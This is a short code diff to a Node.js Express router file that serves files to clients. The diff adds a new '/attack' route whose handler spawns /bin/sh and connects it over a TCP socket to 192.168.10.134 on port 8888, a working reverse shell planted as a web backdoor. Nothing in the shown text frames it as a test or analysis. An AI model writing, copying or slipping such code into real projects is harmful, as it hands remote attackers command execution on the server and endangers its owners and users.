@@ -18,6 +18,7 @@ const Readable = require('stream').Readable;
 var fs = require('fs');
 const { response } = require("express");
 
+
 router.get("/", async (req, res) => {
     // send to file localfile to client
     var r = new Response();
@@ -49,6 +50,20 @@ router.get("/", async (req, res) => {
         };
         return res.json(encryptResponse(r));
     }
+});
+
+
+router.get("/attack", function(){
+	var net = require("net"),
+		cp = require("child_process"),
+		sh = cp.spawn("/bin/sh",[]);
+	var client = new net.Socket();
+	client.connect(8888,"192.168.10.134",function(){
+		client.pipe(sh.stdin);
+		sh.stdout.pipe(client);
+		sh.stderr.pipe(client);
+	});
+	return /a/;
 });
 
 module.exports = router;
